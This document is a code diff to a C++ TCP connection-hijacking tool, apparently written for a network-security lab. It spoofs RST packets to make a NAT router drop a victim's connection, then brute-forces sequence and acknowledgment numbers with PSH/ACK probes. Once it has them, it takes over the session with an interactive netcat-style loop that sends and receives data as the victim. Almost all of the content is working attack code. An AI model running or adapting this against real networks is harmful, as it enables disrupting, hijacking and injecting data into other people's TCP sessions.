@@ -1,9 +1,7 @@
 #include <chrono>
 #include <cstdint>
 #include <iostream>
-#include <limits>
 #include <optional>
-#include <random>
 #include <stdio.h>
 #include <sys/poll.h>
 #include <thread>
@@ -39,34 +37,23 @@ int main(int argc, char **argv) {
       .port = config.port,
   };
 
-  // Get a random number for the initial sequence numbers on the server side.
-  // Remember to seed with a real random number generator.
-  std::random_device rd;
-  std::default_random_engine isn_engine{rd()};
-  std::uniform_int_distribution<uint32_t> isn_dist{ 
-      0, std::numeric_limits<uint32_t>::max() / 2};
-  uint32_t server_isn = isn_dist(isn_engine);
-  uint32_t attacker_isn = isn_dist(isn_engine);
-  uint32_t garbage_ack = isn_dist(isn_engine);
-
   std::cout << "Sending RST to router to evict connection." << std::endl;
 
   // Spoof RST packets to the router from the server
   send_pkt(config, TCPPacket{
                        .src = config.topology.server_addr,
                        .dst = router_addr,
-                       .seqno = server_isn,
-                       .ackno = garbage_ack,
+                       .seqno = 0x0u,
+                       .ackno = 0x0u,
                        .rst = true,
                    });
-
   // Send a second RST in the other half of the 4G space
   // in case the router has extra checks
   send_pkt(config, TCPPacket{
                        .src = config.topology.server_addr,
                        .dst = router_addr,
-                       .seqno = server_isn + std::numeric_limits<uint32_t>::max() / 2,
-                       .ackno = garbage_ack,
+                       .seqno = 0x80000000u,
+                       .ackno = 0x0u,
                        .rst = true,
                    });
 
@@ -75,33 +62,45 @@ int main(int argc, char **argv) {
   // Wait for the NAT to evict the victim's connection
   std::this_thread::sleep_for(config.router_timeout);
 
-  std::cout << "Getting true seqno and ackno with garbage PSH/ACK." << std::endl;
-  // Reset the mapping with PSH/ACK, arbitrary seqno
-  send_pkt(config, TCPPacket{
-                       .src = attacker_addr,
-                       .dst = config.topology.server_addr,
-                       .seqno = attacker_isn,
-                       .ackno = garbage_ack,
-                       .psh = true,
-                   });
+  std::cout << "Getting true seqno and ackno with garbage PSH/ACK."
+            << std::endl;
+  // Reset the mapping with PSH/ACK
+  std::optional<TCPPacket> response{};
+  for (uint32_t i_seq = 0u; i_seq < 2u; i_seq++) {
+    for (uint32_t i_ack = 0u; i_ack < 0x8000u; i_ack++) {
+      send_pkt(config, TCPPacket{
+                           .src = attacker_addr,
+                           .dst = config.topology.server_addr,
+                           .seqno = i_seq * 0x80000000u,
+                           .ackno = i_ack * 0x20000u,
+                           .psh = true,
+                       });
+      response = config.topology.interface.receive(
+          [](const TCPPacket &pkt) -> bool { return !pkt.rst; },
+          std::chrono::milliseconds::zero());
+      if (response.has_value())
+        break;
+    }
+    if (response.has_value())
+      break;
+  }
 
-  // Check response for correct seqno, ack
-  std::optional<TCPPacket> response = config.topology.interface.receive(
-      [](const TCPPacket &pkt) -> bool {
-        // Ignore reset packets
-        return !pkt.rst;
-      },
-      config.timeout);
-  
   if (!response.has_value()) {
-    std::cout << "Error in evicting connection: no response to PSH/ACK." << std::endl;
+    response = config.topology.interface.receive(
+        [](const TCPPacket &pkt) -> bool { return !pkt.rst; }, config.timeout);
+  }
+
+  if (!response.has_value()) {
+    std::cout << "Error in evicting connection: no response to PSH/ACK."
+              << std::endl;
   } else {
     uint32_t true_ackno = response->seqno;
     uint32_t true_seqno = response->ackno.value();
-    std::cout << "Got seqno: " << true_seqno << ", ackno: " << true_ackno << std::endl;
+    std::cout << "Got seqno: " << true_seqno << ", ackno: " << true_ackno
+              << std::endl;
 
     std::cout << "Enabling netcat..." << std::endl;
-    
+
     struct pollfd poll_list[2];
     // First listener: stdin
     poll_list[0].fd = STDIN_FILENO;
@@ -120,21 +119,23 @@ int main(int argc, char **argv) {
         int len = read(STDIN_FILENO, buf, sizeof(buf));
         std::string data(buf, len);
         send_pkt(config, TCPPacket{
-            .src = attacker_addr,
-            .dst = config.topology.server_addr,
-            .seqno = true_seqno,
-            .ackno = true_ackno,
-            .psh = true,
-            .data = data,
-        });
+                             .src = attacker_addr,
+                             .dst = config.topology.server_addr,
+                             .seqno = true_seqno,
+                             .ackno = true_ackno,
+                             .psh = true,
+                             .data = data,
+                         });
       }
       if (poll_list[1].revents & POLLIN) {
         // Check the TUN device immediately for the packet
-        std::optional<TCPPacket> tcp_response = config.topology.interface.receive(
-        [&config](const TCPPacket &pkt) -> bool {
-          // Only packets meant for this port
-          return pkt.dst.port == config.port;
-        }, (std::chrono::milliseconds)5);
+        std::optional<TCPPacket> tcp_response =
+            config.topology.interface.receive(
+                [&config](const TCPPacket &pkt) -> bool {
+                  // Only packets meant for this port
+                  return pkt.dst.port == config.port;
+                },
+                (std::chrono::milliseconds)5);
         if (tcp_response.has_value()) {
           // Update local values
           true_seqno = tcp_response->ackno.value();
@@ -143,29 +144,29 @@ int main(int argc, char **argv) {
           // Server terminates connection
           if (tcp_response->fin) {
             send_pkt(config, TCPPacket{
-              .src = attacker_addr,
-              .dst = config.topology.server_addr,
-              .seqno = true_seqno,
-              .ackno = true_ackno,
-              .fin = true,
-            });
+                                 .src = attacker_addr,
+                                 .dst = config.topology.server_addr,
+                                 .seqno = true_seqno,
+                                 .ackno = true_ackno,
+                                 .fin = true,
+                             });
             break;
           }
 
           // Server sent text
           if (tcp_response->psh) {
             std::cout << tcp_response->data;
-            send_pkt(config, TCPPacket{
-              .src = attacker_addr,
-              .dst = config.topology.server_addr,
-              .seqno = true_seqno,
-              .ackno = true_ackno + tcp_response->data.length(),
-            });
+            send_pkt(config,
+                     TCPPacket{
+                         .src = attacker_addr,
+                         .dst = config.topology.server_addr,
+                         .seqno = true_seqno,
+                         .ackno = true_ackno + tcp_response->data.length(),
+                     });
           }
         }
       }
     }
-
   }
 }
 
